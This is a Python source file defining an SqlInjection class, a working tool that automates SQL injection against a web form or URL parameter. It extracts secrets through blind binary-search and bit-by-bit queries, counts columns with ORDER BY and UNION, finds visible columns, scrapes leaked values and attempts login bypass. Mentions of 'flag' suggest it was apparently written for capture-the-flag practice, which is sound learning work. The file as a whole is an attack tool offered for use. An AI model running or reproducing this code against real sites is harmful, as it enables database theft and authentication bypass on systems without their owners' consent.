from bs4 import BeautifulSoup
from colorama import Fore
from requests.exceptions import HTTPError
from typing import Callable
import difflib
import re
import requests
import time
import urllib3
# from itertools import compress


class SqlInjection:
    def __init__(self, url: str, cook: dict, method: str, inj_param: str,
                 payload: str, check_clear='', other_param=None, timeout=0,
                 fun_encode=None, internal_payload=''):
        self.url = url
        self.cook = cook
        self.method = method
        self.inj_param = inj_param
        self.payload = payload
        self.check_clear = check_clear
        self.other_param = other_param
        self.timeout = timeout
        self.fun_encode = fun_encode
        self.internal_payload = internal_payload

    def my_request(self, print_resp=False, print_param=True, pp_end='\n') -> str:
        time.sleep(self.timeout)
        param = {}
        if self.inj_param:
            param = {self.inj_param: self.payload}
        if self.other_param is not None:
            param.update(self.other_param)
        if print_param:
            print(*[n[0] + '=' + n[1].replace('\n', "\\n") for n in sorted(param.items())],
                  sep=f'{Fore.LIGHTMAGENTA_EX}&{Fore.RESET}', end=pp_end)
        try:
            if self.method == 'get':
                response = requests.get(self.url, params=param, cookies=self.cook)
            elif self.method == 'post':
                response = requests.post(self.url, data=param, cookies=self.cook)
            else:
                print("method must be 'get' or 'post'")
                return ''
            response.raise_for_status()
        except HTTPError as http_err:
            print(f'HTTP error occurred: {http_err}')
        except Exception as err:
            if 'SSLCertVerificationError' in str(err):
                response = self.__my_request_not_verify(param)
                return response
            else:
                print(f'Other error occurred: {err}')
                exit(1)
        else:
            if print_resp:
                if self.method == 'get':
                    print(response.url)
                print(response.text)
            return response.text

    def __check_responce(self, check_func: Callable, a: int, b: int,
                         check_yes, check_no, print_resp=False):
        t1 = time.time()
        response = self.my_request(print_resp, pp_end='')
        t2 = time.time()
        if check_func(response, t1, t2):
            b = check_yes
            print(' yes')
        else:
            a = check_no
            print(' no')
        return a, b

    def find_key_len(self, check_func: Callable, right=32, print_resp=False) -> int:
        left = -1
        num_of_requests = 0
        tmp = self.payload
        while right > left + 1:
            middle = (left + right) // 2
            if '%s' in self.payload:
                self.payload = tmp.replace('%s', str(middle))
            right, left = self.__check_responce(check_func, right, left,
                                                middle, middle, print_resp)
            num_of_requests += 1
            self.payload = tmp
        print('num of requests:', num_of_requests)
        print(f'lenght key is: {Fore.GREEN}{right}{Fore.RESET}')
        return right

    def one_binary(self, check_func: Callable, left=32, right=127,
                   print_resp=False, mode='num'):
        """
        """
        num_of_requests = 0
        tmp = self.payload
        a = left
        b = right
        while b - a != 0:
            middle = a + (b - a) // 2 + 1
            if '%s' in self.payload:
                if mode == 'num':
                    self.payload = tmp.replace('%s', str(middle))
                elif mode == 'hex':
                    self.payload = tmp.replace('%s', hex(middle))
            a, b = self.__check_responce(check_func, a, b, middle-1, middle, print_resp)
            num_of_requests += 1
            self.payload = tmp
        print('num of requests:', num_of_requests)
        print('binary found result: ', a)
        return a

    def find_binary(self, check_func: Callable, len_of_key: int,
                    left=32, right=127, print_resp=False, letter=False,
                    coding='dec', start_i=1) -> str:
        """
        :param start_i:
        :param check_func: function for check success in response
        :param len_of_key: lenght key
        :param right max ascii code of symbol
        :param left min ascii code of symbol
        :param print_resp: print html response
        :param letter: number or letter for middle
        :param coding: dec, hex  for type symbols in database
        :return:
        """
        num_of_requests = 0
        tmp = self.payload
        result = ''
        res = ''
        if coding == 'hex' and left == 32:
            left = 20
        for i in range(start_i, len_of_key + start_i):
            a = left
            b = right
            while b - a != 0:
                middle = a + (b - a) // 2 + 1
                if '%d' in self.payload and '%s' in self.payload:
                    if letter:
                        self.payload = tmp.replace('%d', str(i)).replace('%s', chr(middle))
                    else:
                        self.payload = tmp.replace('%d', str(i)).replace('%s',
                                                                         str(middle))
                a, b = self.__check_responce(check_func, a, b, middle-1, middle, print_resp)
                num_of_requests += 1
                self.payload = tmp
            if coding == 'dec':
                res = chr(a)
            elif coding == 'hex':
                # Convert hex to ascii
                res = bytearray.fromhex(str(a)).decode()
            print(f'symbol {i} in key is: {Fore.LIGHTBLUE_EX}{res}{Fore.RESET}')
            result += res
            print(f'result on this step is: {Fore.LIGHTRED_EX}{result}{Fore.RESET}')

        print('num of requests:', num_of_requests)
        return result

    def find_pass_over_bits(self, check_func: Callable, len_of_key: int,
                            unicode_len_bit=8, print_resp=False) -> str:
        """
        text: str of success in response
        unicode_len_bit: len of char in bits, 8 for ascii, 32 for utf-32 etc.
        """
        result = ''
        num_of_requests = 0
        tmp = self.payload
        for j in range(1, len_of_key * 8 // unicode_len_bit + 1):
            bit = ''
            for i in range(1, unicode_len_bit + 1):
                self.payload = tmp.replace('%s1', str(j)).replace('%s2', str(unicode_len_bit)).replace('%s3', str(i))
                a, b = self.__check_responce(check_func, bit, bit, bit+'1', bit+'0', print_resp)
                bit = a if len(a) > len(b) else b
                num_of_requests += 1
                self.payload = tmp

            print(f'{Fore.BLUE}{bit}{Fore.RESET}', hex(int(bit, 2))[2:])
            uni_letter = chr(int(bit, 2))
            print(f'{Fore.LIGHTRED_EX}{uni_letter}{Fore.RESET}')
            result += uni_letter

        print('num_of_requests:', num_of_requests)
        print(f'result: {Fore.LIGHTMAGENTA_EX}{result}{Fore.RESET}')
        return result

    def resp_with_message(self, text="select"):
        response = self.my_request()

        soup = BeautifulSoup(response, 'html.parser')
        message = soup.find_all(string=re.compile(text))
        print(message)

    def __my_request_not_verify(self, param: dict) -> str:
        urllib3.disable_warnings()
        try:
            response = (
                requests.get(self.url, params=param, cookies=self.cook, verify=False)
                if self.method == 'get' else
                requests.post(self.url, data=param, cookies=self.cook, verify=False))
            response.raise_for_status()
        except HTTPError as http_err:
            print(f'HTTP error occurred: {http_err}')
            exit(1)
        except Exception as err:
            print(f'Other error occurred: {err}')
            exit(1)
        else:
            return response.text

    def find_error(self):
        html_response = self.my_request()
        res = html_response.replace('<b>', '').replace('</b>', '').replace('\n', '')
        soup = BeautifulSoup(res, 'html.parser')
        war = soup.find_all(string=re.compile("Warning"))
        print(f'waring: ', war)
        return war

    def __encode_payload(self, replaced):
        self.payload = self.payload.replace('%s', replaced)
        if self.fun_encode:
            print(self.payload)
            self.payload = self.fun_encode(self.payload)
        return self.my_request()

    def count_columns_order_by(self) -> int:
        """
        """
        max_columns = 30
        response_1 = ''
        tmp = self.payload
        for i in range(1, max_columns):
            response_2 = self.__encode_payload(str(i))
            # Deleting form content
            '''
            html_response_2 = html_response_2[:html_response_2.find('<form')] + \
                              html_response_2[
                              html_response_2.find('/form>') + 6:]
            '''
            for s in difflib.ndiff(response_2, response_1):
                if i > 1 and ('+' in s[0] or '-' in s[0]):
                    print(f'num of columns: {Fore.LIGHTMAGENTA_EX}{i - 1}{Fore.RESET}')
                    return i - 1
                response_1 = response_2
            self.payload = tmp

        print('num of columns not find')
        return False

    def count_columns_union(self) -> int:
        """
        """
        max_columns = 30
        # response_1 = ''
        tmp = self.payload
        list_of_columns = [str(c + 1) * 3 for c in range(max_columns)]
        for i in range(1, max_columns):
            testing_list = list_of_columns[:i]
            response_2 = self.__encode_payload(','.join(testing_list))
            # Deleting form content
            '''
            html_response_2 = html_response_2[:html_response_2.find('<form')] + \
                              html_response_2[
                              html_response_2.find('/form>') + 6:]
            '''
            # Todo may be difflib for union inj?
            '''
            for s in difflib.ndiff(response_2, response_1):
                if i > 1 and ('+' in s[0] or '-' in s[0]):
                    print(f'num of columns: {Fore.LIGHTMAGENTA_EX}{i - 1}{Fore.RESET}')
                    return i - 1
                response_1 = response_2
            '''
            if 'error' not in response_2:
                print(f'num of columns: {Fore.LIGHTMAGENTA_EX}{i}{Fore.RESET}')
                return i

            self.payload = tmp

        print('num of columns not find')
        return False

    def find_visible_columns(self, columns: int) -> tuple:
        # for payload in payload
        list_of_columns = [str(c + 1) * 3 for c in range(columns)]
        tmp = list_of_columns.copy()
        tmp_payload = self.payload
        tmp_internal_payload = self.internal_payload
        if self.internal_payload:
            self.internal_payload = self.internal_payload.replace('%s', ','.join(list_of_columns))
            hex_internal = '0x' + self.internal_payload.encode('utf-8').hex()
            list_of_columns = [hex_internal for _ in range(columns)]
        print('list of columns: ', list_of_columns)

        html_visible = self.__encode_payload(','.join(list_of_columns))
        list_of_visible = [text for text in tmp if text in html_visible]

        self.payload = tmp_payload
        self.internal_payload = tmp_internal_payload
        if list_of_visible:
            print(f'visible columns: {Fore.LIGHTGREEN_EX}{list_of_visible}{Fore.RESET}')
            return html_visible, list_of_visible
        else:
            print('not find visible column')
            return html_visible, False

    def find_param(self, finds: list, html_visible: str, columns: int):
        # Find param
        keys = []
        tmp = self.payload
        tmp_internal = self.internal_payload
        for field in finds:
            print('field now', field)
            if self.internal_payload:
                list_internal = [field for _ in range(columns)]
                self.internal_payload = self.internal_payload.replace('%s', ','.join(list_internal))
                field = '0x' + self.internal_payload.encode('utf-8').hex()
            # put field in all columns
            list_external = [field for _ in range(columns)]
            html_response = self.__encode_payload(','.join(list_external))
            # Deleting form content
            ''' 
            html_response = html_response[:html_response.find('<form')] + \
                            html_response[html_response.find('/form>') + 6:]
            '''
            # Find differens
            index = 0
            key = []
            while html_response[index] == html_visible[index]:
                index += 1
            new_index = index
            # + 3 because 111,222 etc in request
            while html_response[new_index] != html_visible[index + 3]:
                key.append(html_response[new_index])
                new_index += 1
            print(f"key: {Fore.LIGHTBLUE_EX}{''.join(key)}{Fore.RESET}")
            keys.append(''.join(key))

            # testing for end
            if len(html_response[new_index:]) > len(html_visible[index:]):
                pass
                # print('not end')
                # ToDo Find all words which contains in html_response[] and
                # not contains in html_visible[]
            self.payload = tmp
            self.internal_payload = tmp_internal
        return keys

    def extract_pass(self, response: str) -> str:
        soup = BeautifulSoup(response.replace('<b>', ''), 'html.parser')
        print(soup.find_all(string=re.compile("flag")))

        passw = soup.find(string=re.compile(self.check_clear)).replace(self.check_clear, '')
        print(f'password: {Fore.LIGHTRED_EX}{passw}{Fore.RESET}')
        return passw

    def try_auth(self, columns: int, finds: str) -> str:
        """
        Тry to log in if we know the number of columns and what we write in them.
        """
        list_of_columns = [finds for _ in range(columns)]
        self.payload = self.payload.replace('%s', ','.join(list_of_columns))
        response = self.my_request()
        if 'Login successful' in response:
            return response
        print('auth not success')
        return ''
